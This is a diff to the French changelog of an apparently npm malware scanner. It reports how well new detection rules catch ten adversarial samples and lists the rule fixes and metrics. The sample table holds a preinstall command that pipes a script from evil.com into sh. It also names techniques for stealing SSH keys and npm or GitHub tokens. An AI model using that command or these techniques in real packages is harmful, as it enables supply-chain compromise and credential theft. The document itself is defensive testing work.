@@ -726,6 +726,66 @@ Documentation detaillee : [docs/EVALUATION_METHODOLOGY.md](EVALUATION_METHODOLOG
 
 ---
 
+## MUAD'DIB 2.2.1 — Holdout v2 & corrections (20 Fevrier 2026)
+
+### Holdout v2 : mesure de generalisation
+
+Apres la correction des 7 blind spots du holdout v1, un deuxieme batch de 10 samples a ete cree avec les regles gelees pour mesurer si les ameliorations generalisent au-dela des patterns deja vus.
+
+**Score pre-tuning : 4/10 (40%)** — amelioration de +10pp par rapport au holdout v1 (30%).
+
+| Sample | Technique | Score brut | Seuil | Resultat |
+|--------|-----------|-----------|-------|----------|
+| env-var-reconstruction | `String.fromCharCode` pour reconstruire `process.env.GITHUB_TOKEN` | 3 | 25 | FAIL |
+| homedir-ssh-key-steal | `os.homedir()` + lecture `.ssh/id_rsa` + `https.request` | 35 | 30 | PASS |
+| setTimeout-chain | `setTimeout` nested + `readFileSync(.npmrc)` + `fetch` | 35 | 25 | PASS |
+| wasm-loader | Faux chargeur WASM qui lit `process.env.NPM_TOKEN` + `https.get` | 25 | 20 | PASS |
+| npm-lifecycle-preinstall-curl | `preinstall: "curl http://evil.com/payload.sh \| sh"` | 13 | 30 | FAIL |
+| process-env-proxy-getter | `Object.defineProperty(process.env)` getter trap | 0 | 20 | FAIL |
+| readable-stream-hijack | `stream.Readable.prototype.push` override | 0 | 20 | FAIL |
+| github-workflow-inject | Lecture `.github/workflows` + ecriture workflow malveillant (template `${{ secrets }}`) | 0 | 25 | FAIL |
+| npm-cache-poison | Lecture `.npmrc` token + ecriture dans `_cacache` | 0 | 20 | FAIL |
+| conditional-os-payload | `os.platform()` + payload conditionnel Windows/Linux | 35 | 25 | PASS |
+
+### 6 corrections
+
+**1. env-var-reconstruction** (3 → 38) : Nouveau type `env_charcode_reconstruction` (MUADDIB-AST-018). Le scanner AST detecte maintenant `String.fromCharCode` utilise pour reconstruire dynamiquement des noms de variables d'environnement, une technique d'evasion qui contourne la detection statique de `process.env.GITHUB_TOKEN`.
+
+**2. npm-lifecycle-preinstall-curl** (13 → 38) : Nouveau type `lifecycle_shell_pipe` (MUADDIB-PKG-010). Le scanner package detecte maintenant `curl | sh` et `wget | sh` dans les scripts lifecycle critiques (preinstall/install/postinstall).
+
+**3. process-env-proxy-getter** (0 → 25) : Extension de `env_proxy_intercept` (MUADDIB-AST-009) pour detecter `Object.defineProperty(process.env, ...)` en plus du pattern `new Proxy(process.env)` existant.
+
+**4. readable-stream-hijack** (0 → 25) : Extension de `prototype_hook` (MUADDIB-AST-017) pour detecter le hijacking de prototypes de modules Node.js core (`http.IncomingMessage`, `stream.Readable`, `net.Socket`, `tls.TLSSocket`, `events.EventEmitter`, `buffer.Buffer`).
+
+**5. github-workflow-inject** (0 → 25) : Extension de `workflow_write` (MUADDIB-AST-015) avec propagation de variables a travers `path.join()` et ajout d'un fallback regex dans le bloc catch d'acorn — necessaire car les expressions GitHub Actions `${{ secrets.GITHUB_TOKEN }}` dans les template literals font echouer le parser AST.
+
+**6. npm-cache-poison** (0 → 25) : Nouveau type `credential_tampering` (MUADDIB-FLOW-003). Le scanner dataflow detecte maintenant l'ecriture dans les caches sensibles (`_cacache`, `.cache/yarn`, `.cache/pip`) combinee a la lecture de donnees sensibles — pattern de cache poisoning.
+
+### Progression des scores pre-tuning
+
+| Batch | Score | Tendance |
+|-------|-------|----------|
+| Vague 1 | ~14% | Baseline |
+| Test robustesse | 33% (1/3) | Amelioration |
+| Vague 2 | 0% (0/5) | Regression (nouvelles techniques) |
+| Intermediate | 60% (3/5) | Les corrections generalisent |
+| Vague 3 | 60% (3/5) | Stabilisation |
+| Holdout v1 | 30% (3/10) | Vrais angles morts |
+| **Holdout v2** | **40% (4/10)** | Amelioration marginale |
+
+### Resultats finaux v2.2.1
+
+| Metrique | Valeur | Details |
+|----------|--------|---------|
+| **TPR** (Ground Truth) | **100%** (4/4) | event-stream, ua-parser-js, coa, node-ipc |
+| **FPR** (Benign) | **0%** (0/98) | Aucun faux positif |
+| **ADR** (Adversarial) | **100%** (45/45) | 45 samples evasifs detectes |
+| **Holdout v2** (pre-tuning) | **40%** (4/10) | 10 samples jamais vus |
+
+**781 tests**, 0 echecs. **89 regles de detection**. **13 scanners paralleles**.
+
+---
+
 ## Etat actuel
 
 ### Ce qui fonctionne
@@ -747,8 +807,8 @@ Documentation detaillee : [docs/EVALUATION_METHODOLOGY.md](EVALUATION_METHODOLOG
 | Version check | Notification automatique des nouvelles versions au demarrage |
 | **Detection comportementale (v2.0)** | Temporal lifecycle, AST diff, publish anomaly, maintainer change, canary tokens |
 | **Validation & Observabilite (v2.1)** | Ground truth (5 attaques, 100%), detection time logging, FP rate tracking, score breakdown, threat feed API |
-| **Evaluation & Red Team (v2.2)** | `muaddib evaluate`, 35 samples adversariaux (4 vagues + holdout), TPR 100%, FPR 0%, ADR 100%, Holdout 30%, 13 scanners, 86 règles, AI config scanner |
-| Tests | **781 tests unitaires** + 56 fuzz + 35 adversariaux, **74% coverage** (Codecov) |
+| **Evaluation & Red Team (v2.2)** | `muaddib evaluate`, 45 samples adversariaux (4 vagues + holdout v1 + holdout v2), TPR 100%, FPR 0%, ADR 100%, Holdout v1 30%, Holdout v2 40%, 13 scanners, 89 règles, AI config scanner |
+| Tests | **781 tests unitaires** + 56 fuzz + 45 adversariaux, **74% coverage** (Codecov) |
 | **Hardening securite (v2.1.2)** | SSRF protection (shared/download.js), command injection prevention (execFileSync), path traversal (sanitizePackageName), JSON.parse protege, webhook strict |
 | Audit securite | 2 audits complets, **58 issues corrigees**, [rapport PDF](MUADDIB_Security_Audit_Report_v1.4.1.pdf) |
 
